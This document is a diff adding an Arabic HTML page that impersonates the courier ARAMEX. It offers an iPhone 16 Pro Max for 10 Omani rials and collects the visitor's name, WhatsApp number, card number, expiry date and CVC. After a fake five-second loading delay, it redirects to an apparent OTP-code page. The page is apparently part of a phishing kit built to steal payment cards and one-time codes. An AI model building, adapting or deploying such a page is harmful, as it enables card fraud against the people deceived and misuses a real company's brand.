@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+ <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>التحقق من الرمز - ARAMEX</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Aramex_logo.svg/2560px-Aramex_logo.svg.png" type="image/png">
+
+  <!-- Google Fonts -->
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic&display=swap" rel="stylesheet" />
+
+  <!-- Meta Description SEO -->
+  <meta name="description" content="تحقق من رمز OTP الخاص بك لمتابعة طلبك بأمان مع ARAMEX. عملية دفع سريعة وآمنة.">
+
+  <!-- Open Graph (Pour Facebook, WhatsApp, etc.) -->
+  <meta property="og:title" content="التحقق من الرمز - ARAMEX">
+  <meta property="og:description" content="أدخل رمز التحقق لإكمال عملية الدفع مع ARAMEX. خدمة سريعة وآمنة.">
+  <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Aramex_logo.svg/2560px-Aramex_logo.svg.png">
+  <meta property="og:url" content="https://www.aramex.com/">
+  <meta property="og:type" content="website">
+  <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b0/Aramex_logo.svg/2560px-Aramex_logo.svg.png" type="image/png" />
+  <link rel="stylesheet" href="style.css" />
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic&display=swap" rel="stylesheet" />
+  <style>
+    /* Style simplifié mais pro pour l'exemple */
+    body {
+      font-family: 'Noto Kufi Arabic', sans-serif;
+      background: #f5f7fa;
+      margin: 0; padding: 0;
+      direction: rtl;
+    }
+    .navbar {
+      background: #e30613;
+      padding: 15px 20px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 15px;
+    }
+    .nav-logo {
+      height: 35px;
+    }
+    .nav-title {
+      color: #fff;
+      font-weight: bold;
+      font-size: 1.2rem;
+    }
+    .main-container {
+      max-width: 420px;
+      margin: 40px auto;
+      background: #fff;
+      border-radius: 12px;
+      padding: 25px;
+      box-shadow: 0 4px 12px rgb(0 0 0 / 0.1);
+    }
+    .product-image {
+      width: 100%;
+      border-radius: 15px;
+      margin-bottom: 15px;
+    }
+    .product-title {
+      text-align: center;
+      font-weight: 900;
+      margin-bottom: 20px;
+      font-size: 1.5rem;
+      color: #333;
+    }
+    form .form-group {
+      margin-bottom: 15px;
+      text-align: right;
+    }
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-weight: bold;
+      color: #222;
+    }
+    select, input[type="text"], input[type="tel"], input[type="number"] {
+      width: 100%;
+      padding: 10px 12px;
+      font-size: 1rem;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      box-sizing: border-box;
+      font-family: 'Noto Kufi Arabic', sans-serif;
+      text-align: right;
+      direction: ltr;
+    }
+    select {
+      direction: rtl; /* Pour le texte du select */
+    }
+    .card-number-wrapper {
+      position: relative;
+    }
+    .card-icons-right {
+      position: absolute;
+      top: 50%;
+      right: 10px;
+      transform: translateY(-50%);
+      display: flex;
+      gap: 8px;
+      opacity: 0.6;
+      pointer-events: none;
+    }
+    .card-icons-right img {
+      height: 20px;
+      width: auto;
+    }
+    .expiry-wrapper {
+      display: flex;
+      gap: 10px;
+    }
+    .expiry-wrapper input {
+      flex: 1;
+      text-align: center;
+      direction: ltr;
+    }
+    button[type="submit"] {
+      width: 100%;
+      background-color: #e30613;
+      color: white;
+      padding: 14px;
+      font-size: 1.1rem;
+      font-weight: bold;
+      border: none;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    button[type="submit"]:hover:not(:disabled) {
+      background-color: #b9040f;
+    }
+    button[type="submit"]:disabled {
+      background-color: #9c0b0e;
+      cursor: not-allowed;
+    }
+    #loading {
+      display: none;
+      text-align: center;
+      margin-top: 20px;
+      font-size: 1.1rem;
+      color: #007bff;
+      font-weight: bold;
+    }
+    footer.footer {
+      text-align: center;
+      margin: 40px 0 20px;
+      font-weight: bold;
+      color: #444;
+    }
+    @media (max-width: 480px) {
+      .main-container {
+        margin: 20px 15px;
+        padding: 20px;
+      }
+      .product-title {
+        font-size: 1.3rem;
+      }
+    }
+  </style>
+</head>
+<body>
+
+  <nav class="navbar">
+    <img src="https://images.seeklogo.com/logo-png/24/1/aramex-logo-png_seeklogo-249605.png" alt="ARAMEX Logo" class="nav-logo" />
+    <span class="nav-title">الدفع الآمن عبر البطاقة</span>
+  </nav>
+
+  <main class="main-container">
+    <img src="https://www.dxomark.com/wp-content/uploads/drafts/post-178568/Apple-iPhone-16-Pro-Max_featured-image-packshot-review.png" class="product-image" alt="iPhone 16 Pro Max" />
+    <h2 class="product-title">iPhone 16 Pro Max</h2>
+
+    <form id="payment-form">
+      <div class="form-group">
+        <label>اختر اللون:</label>
+        <select name="color" required>
+          <option value="">-- اختر --</option>
+          <option value="Titanium Black">Titanium Black</option>
+          <option value="Titanium White">Titanium White</option>
+          <option value="Titanium Blue">Titanium Blue</option>
+          <option value="Titanium Natural">Titanium Natural</option>
+        </select>
+      </div>
+
+      <div class="form-group">
+        <label>الاسم الكامل:</label>
+        <input type="text" name="fullName" required />
+      </div>
+
+      <div class="form-group">
+        <label>رقم الهاتف (واتساب):</label>
+        <input type="tel" name="phone" maxlength="10" required />
+      </div>
+
+      <div class="form-group">
+        <label>اسم حامل البطاقة:</label>
+        <input type="text" name="cName" required />
+      </div>
+
+      <div class="form-group">
+        <label>رقم البطاقة:</label>
+        <div class="card-number-wrapper">
+          <div class="card-icons-right">
+            <img src="https://cdn-icons-png.flaticon.com/512/349/349221.png" alt="Visa" />
+            <img src="https://cdn-icons-png.flaticon.com/512/349/349230.png" alt="MasterCard" />
+            <img src="https://cdn-icons-png.flaticon.com/512/349/349228.png" alt="Card" />
+          </div>
+          <input type="text" name="cNum" id="cardNumber" maxlength="19" required />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>تاريخ الانتهاء:</label>
+        <div class="expiry-wrapper">
+          <input type="text" name="expMonth" placeholder="MM" maxlength="2" required />
+          <input type="text" name="expYear" placeholder="YYYY" maxlength="4" required />
+        </div>
+      </div>
+
+      <div class="form-group">
+        <label>رمز CVC:</label>
+        <input type="number" name="CVC" maxlength="3" required />
+      </div>
+
+      <button type="submit">تأكيد الدفع (10 ريال عماني)</button>
+    </form>
+
+    <div id="loading">⏳ جاري المعالجة، الرجاء الانتظار...</div>
+  </main>
+
+  <footer class="footer">
+    <p>© 2025 جميع الحقوق محفوظة لشركة ARAMEX Express LTD</p>
+  </footer>
+
+  <script>
+    const cardNumberInput = document.getElementById('cardNumber');
+
+    cardNumberInput.addEventListener('input', function () {
+      let val = this.value.replace(/\s/g, '').replace(/[^\d]/g, '');
+      this.value = val.replace(/(.{4})/g, '$1 ').trim();
+    });
+
+    // Loading + redirection après submit
+    const form = document.getElementById("payment-form");
+    const loadingDiv = document.getElementById("loading");
+    const submitBtn = form.querySelector("button");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      // Ici tu peux ajouter une validation supplémentaire si tu veux
+
+      loadingDiv.style.display = "block";
+      submitBtn.disabled = true;
+
+      setTimeout(() => {
+        window.location.href = "code.html";
+      }, 5000);
+    });
+  </script>
+</body>
+</html>
